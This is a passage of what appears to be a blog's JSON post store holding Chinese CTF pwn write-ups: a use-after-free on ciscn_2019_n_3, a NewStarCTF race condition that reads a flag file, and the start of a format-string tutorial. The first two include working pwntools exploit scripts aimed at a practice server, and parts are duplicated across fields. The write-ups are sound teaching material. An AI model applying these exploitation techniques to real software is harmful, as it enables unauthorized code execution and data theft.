class=\"string\">&#x27;Index &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Type &gt; &#x27;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\t\tp.recvuntil(<span class=\"string\">&#x27;Value &gt; &#x27;</span>)</span><br><span class=\"line\">\t\tp.sendline(<span class=\"built_in\">str</span>(value))</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\t\tp.recvuntil(<span class=\"string\">&#x27;Length &gt; &#x27;</span>)</span><br><span class=\"line\">\t\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\t\tp.recvuntil(<span class=\"string\">&#x27;Value &gt; &#x27;</span>)</span><br><span class=\"line\">\t\tp.sendline(<span class=\"built_in\">str</span>(value))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Here is it:&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_note</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;CNote &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Index &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dump_note</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;CNote &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Index &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add_note(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">1234</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">5678</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&quot;sh\\x00\\x00&quot;</span>+p32(sys)</span><br><span class=\"line\">add_note(<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">12</span>,payload)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","site":{"data":{}},"excerpt":"<p>ciscn_2019_n_3，对UAF的利用</p>","more":"<p>查壳,32位，除了PIE和RELRO其他都开了<br><img src=\"./ciscn_2019_n_3/check.png\" alt=\"check\"></p>\n<p>反汇编之后可以看到是个经典的菜单堆题。有四个功能，new note、del note、show note和purchase，购买的功能可以忽略。</p>\n<p>note分为两种，一种是记录数字的，一种是记录字符串的，但结构是类似的，每个note的user data都是0xc大小。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">note</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> (*rec_print)(<span class=\"type\">int</span>);  <span class=\"comment\">//存放自定义print函数的函数指针，记录数字和记录字符串的print函数不一样</span></span><br><span class=\"line\">    <span class=\"type\">int</span> (*rec_free)(<span class=\"type\">void</span>*); <span class=\"comment\">//存放自定义free函数的函数指针，记录数字和记录字符串的free函数不一样</span></span><br><span class=\"line\">    <span class=\"type\">int</span> Integer;    <span class=\"comment\">//存放数字时是这样</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* Text;     <span class=\"comment\">//存放字符串时是这样，会通过malloc(length)分配内存</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>main函数中存在system()函数，因此这次不用泄露libc得到system地址了。</p>\n<p>这题主要的漏洞点在note的free函数中，在free后没有对指针赋NULL，存在UAF。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">rec_str_free</span><span class=\"params\">(<span class=\"type\">void</span> *ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(*((<span class=\"type\">void</span> **)ptr + <span class=\"number\">2</span>));</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Note freed!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到并没有对record[index]赋NULL，因此即使del了一个note，该note仍然能被利用执行他的功能，如show note和del note。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">do_del</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v0 = ask(<span class=\"string\">&quot;Index&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (*(<span class=\"type\">int</span> (__cdecl **)(<span class=\"type\">int</span>))(records[v0] + <span class=\"number\">4</span>))(records[v0]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这题中show和del都是依靠存放在note中的函数指针去实现的，我们可以尝试改写函数指针位置的内容为system，再调用对应的功能，就可以执行system函数。show note因为执行的是(*(int (__cdecl **)(int))(records[v0]))(records[v0])，不能执行system(“/bin/sh”)，因此考虑修改自定义的free函数指针。</p>\n<p>修改函数指针则利用了fast bin的机制，执行free时，如果chunk的大小在fast bin范围内，会先放入fast bin，之后malloc的时候，如果malloc的chunk大小在fast bin的范围内，会优先在fast bin中查找有没有刚好满足大小的chunk，如果有，则直接返回。</p>\n<p>而记录字符串的note会根据字符串的长度length申请一个chunk来存放字符串，通过设置length==0xc，可以申请到我们之前free的chunk，那么我们可以利用这个字符串来修改chunk中的数据，修改free函数指针为system，修改第一个4byte为”sh\\x00\\x00”，之后利用UAF，执行已经释放的note的del功能，就可以执行system(“sh\\x00\\x00”)了。</p>\n<p>堆布局：<br>1.先申请两个integer note，并先后free掉<br>2.申请一个text note,并设置length==0xc，写入”sh\\x00\\x00”和system@plt<br>3.执行对应integer note的del note功能get shell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ciscn_2019_n_3&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./ciscn_2019_n_3&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">29707</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">sys=elf.plt[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_note</span>(<span class=\"params\">idx,<span class=\"built_in\">type</span>,size,value</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;CNote &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Index &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Type &gt; &#x27;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\t\tp.recvuntil(<span class=\"string\">&#x27;Value &gt; &#x27;</span>)</span><br><span class=\"line\">\t\tp.sendline(<span class=\"built_in\">str</span>(value))</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\t\tp.recvuntil(<span class=\"string\">&#x27;Length &gt; &#x27;</span>)</span><br><span class=\"line\">\t\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\t\tp.recvuntil(<span class=\"string\">&#x27;Value &gt; &#x27;</span>)</span><br><span class=\"line\">\t\tp.sendline(<span class=\"built_in\">str</span>(value))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Here is it:&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_note</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;CNote &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Index &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dump_note</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;CNote &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Index &gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add_note(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">1234</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">5678</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&quot;sh\\x00\\x00&quot;</span>+p32(sys)</span><br><span class=\"line\">add_note(<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">12</span>,payload)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"buffer_fly","date":"2023-01-02T11:54:26.000Z","_content":"\nNewStarCTF，竞争条件，操作系统中说的共享变量的问题\n<!-- more -->\n\n程序中有ls,cat,mv三个功能。其中ls和cat是直接执行system(\"ls\")和system(\"cat ...\")。\n\n不过并不能直接cat flag。程序会检查输入的文件名filename（这是一个**全局变量**，在bss段中）是否出现了\"./\"，该文件名是否存在。如果没有\"./\"且文件名存在的话，程序会新开一个线程执行cating函数。\n\n在cating函数中会再次对文件名进行检测，如果文件名是flag的话是不会cat的，但如果不是flag的话，他会先sleep(1)休眠1s，然后再执行system(\"cat ...\")。\n\n这里就要用到程序中的第三个功能mv了，mv可以修改filename（这是一个**全局变量**，在bss段中）。因此如果我们**在cating线程休眠的时候，使用mv修改filename为flag**，那么就可以执行cat flag。\n\n不过我们也要先通过前面的检测，**一开始输入的文件名不能有\"./\"，不能是flag，也必须要存在**。这时我们可以借助ls功能查看该目录下的文件，发现有个叫backdoor的文件，就把输入的文件名写为backdoor。\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='cat_flag'\nelf=ELF('./'+filename)\n#libc=ELF('')\n#p=process('./'+filename)\np=remote('node4.buuoj.cn',28600)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug():\n  gdb.attach(p)\n  pause()\n\nru('==>')\nsl('2')\nru('cat.')\nsl('backdoor')#an exist file\nru('==>')\nsl('3')\nru('change.')\nsl('flag')\n\nitr()\n```","source":"_posts/cat_flag.md","raw":"---\ntitle: buffer_fly\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- race_condition\n\n---\n\nNewStarCTF，竞争条件，操作系统中说的共享变量的问题\n<!-- more -->\n\n程序中有ls,cat,mv三个功能。其中ls和cat是直接执行system(\"ls\")和system(\"cat ...\")。\n\n不过并不能直接cat flag。程序会检查输入的文件名filename（这是一个**全局变量**，在bss段中）是否出现了\"./\"，该文件名是否存在。如果没有\"./\"且文件名存在的话，程序会新开一个线程执行cating函数。\n\n在cating函数中会再次对文件名进行检测，如果文件名是flag的话是不会cat的，但如果不是flag的话，他会先sleep(1)休眠1s，然后再执行system(\"cat ...\")。\n\n这里就要用到程序中的第三个功能mv了，mv可以修改filename（这是一个**全局变量**，在bss段中）。因此如果我们**在cating线程休眠的时候，使用mv修改filename为flag**，那么就可以执行cat flag。\n\n不过我们也要先通过前面的检测，**一开始输入的文件名不能有\"./\"，不能是flag，也必须要存在**。这时我们可以借助ls功能查看该目录下的文件，发现有个叫backdoor的文件，就把输入的文件名写为backdoor。\n\nexp:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='cat_flag'\nelf=ELF('./'+filename)\n#libc=ELF('')\n#p=process('./'+filename)\np=remote('node4.buuoj.cn',28600)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug():\n  gdb.attach(p)\n  pause()\n\nru('==>')\nsl('2')\nru('cat.')\nsl('backdoor')#an exist file\nru('==>')\nsl('3')\nru('change.')\nsl('flag')\n\nitr()\n```","slug":"cat_flag","published":1,"updated":"2023-01-02T16:09:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaft00335oud8edy0ruy","content":"<p>NewStarCTF，竞争条件，操作系统中说的共享变量的问题</p>\n<span id=\"more\"></span>\n\n<p>程序中有ls,cat,mv三个功能。其中ls和cat是直接执行system(“ls”)和system(“cat …”)。</p>\n<p>不过并不能直接cat flag。程序会检查输入的文件名filename（这是一个<strong>全局变量</strong>，在bss段中）是否出现了”./“，该文件名是否存在。如果没有”./“且文件名存在的话，程序会新开一个线程执行cating函数。</p>\n<p>在cating函数中会再次对文件名进行检测，如果文件名是flag的话是不会cat的，但如果不是flag的话，他会先sleep(1)休眠1s，然后再执行system(“cat …”)。</p>\n<p>这里就要用到程序中的第三个功能mv了，mv可以修改filename（这是一个<strong>全局变量</strong>，在bss段中）。因此如果我们<strong>在cating线程休眠的时候，使用mv修改filename为flag</strong>，那么就可以执行cat flag。</p>\n<p>不过我们也要先通过前面的检测，<strong>一开始输入的文件名不能有”./“，不能是flag，也必须要存在</strong>。这时我们可以借助ls功能查看该目录下的文件，发现有个叫backdoor的文件，就把输入的文件名写为backdoor。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;cat_flag&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">28600</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">  gdb.attach(p)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;==&gt;&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;cat.&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;backdoor&#x27;</span>)<span class=\"comment\">#an exist file</span></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;==&gt;&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;change.&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;flag&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>NewStarCTF，竞争条件，操作系统中说的共享变量的问题</p>","more":"<p>程序中有ls,cat,mv三个功能。其中ls和cat是直接执行system(“ls”)和system(“cat …”)。</p>\n<p>不过并不能直接cat flag。程序会检查输入的文件名filename（这是一个<strong>全局变量</strong>，在bss段中）是否出现了”./“，该文件名是否存在。如果没有”./“且文件名存在的话，程序会新开一个线程执行cating函数。</p>\n<p>在cating函数中会再次对文件名进行检测，如果文件名是flag的话是不会cat的，但如果不是flag的话，他会先sleep(1)休眠1s，然后再执行system(“cat …”)。</p>\n<p>这里就要用到程序中的第三个功能mv了，mv可以修改filename（这是一个<strong>全局变量</strong>，在bss段中）。因此如果我们<strong>在cating线程休眠的时候，使用mv修改filename为flag</strong>，那么就可以执行cat flag。</p>\n<p>不过我们也要先通过前面的检测，<strong>一开始输入的文件名不能有”./“，不能是flag，也必须要存在</strong>。这时我们可以借助ls功能查看该目录下的文件，发现有个叫backdoor的文件，就把输入的文件名写为backdoor。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;cat_flag&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">28600</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">  gdb.attach(p)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;==&gt;&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;cat.&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;backdoor&#x27;</span>)<span class=\"comment\">#an exist file</span></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;==&gt;&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;change.&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;flag&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"格式化字符串漏洞的利用","date":"2023-01-01T16:00:30.000Z","_content":"格式化字符串漏洞是针对利用格式化字符串的函数（如printf、sprintf...）的漏洞\n格式化字符串函数是一种具有可变参数的函数，其参数分为格式化字符串和可变参数两部分，可变参数的数量由格式化字符串中的格式化字符来决定\n<!--more-->\n\n```c\nprintf(\"number: %d, hex: %x, sth: %s\",10,0x400000,0x40006a);\n```\n在上述例子中，第一个参数即为格式化字符串，其中的%d,%s,%x即为格式化字符\n\n第二、第三、第四个参数都是可变参数，按照顺序放入格式化字符的位置，并按照格式化字符解析\n%d表示解析为10进制数、%x表示解析为16进制数、%s则将该参数视作指针，解析为该参数指向内存的内容，并以字符串的形式显示\n\n格式化字符串漏洞\n\n## 利用格式化字符串漏洞进行泄露\n","source":"_posts/format.md","raw":"---\ntitle: 格式化字符串漏洞的利用\ndate: 2023-01-02 00:00:30\ncategories: \n- pwn\ntags: \n- pwn\n- format\n---\n格式化字符串漏洞是针对利用格式化字符串的函数（如printf、sprintf...）的漏洞\n格式化字符串函数是一种具有可变参数的函数，其参数分为格式化字符串和可变参数两部分，可变参数的数量由格式化字符串中的格式化字符来决定\n<!--more-->\n\n```c\nprintf(\"number: %d, hex: %x, sth: %s\",10,0x400000,0x40006a);\n```\n在上述例子中，第一个参数即为格式化字符串，其中的%d,%s,%x即为格式化字符\n\n第二、第三、第四个参数都是可变参数，按照顺序放入格式化字符的位置，并按照格式化字符解析\n%d表示解析为10进制数、%x表示解析为16进制数、%s则将该参数视作指针，解析为该参数指向内存的内容，并以字符串的形式显示\n\n格式化字符串漏洞\n\n## 利用格式化字符串漏洞进行泄露\n","slug":"format","published":1,"updated":"2023-01-03T15:00:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafu00365oudha4a289e","content":"<p>格式化字符串漏洞是针对利用格式化字符串的函数（如printf、sprintf…）的漏洞<br>格式化字符串函数是一种具有可变参数的函数，其参数分为格式化字符串和可变参数两部分，可变参数的数量由格式化字符串中的格式化字符来决定</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;number: %d, hex: %x, sth: %s&quot;</span>,<span 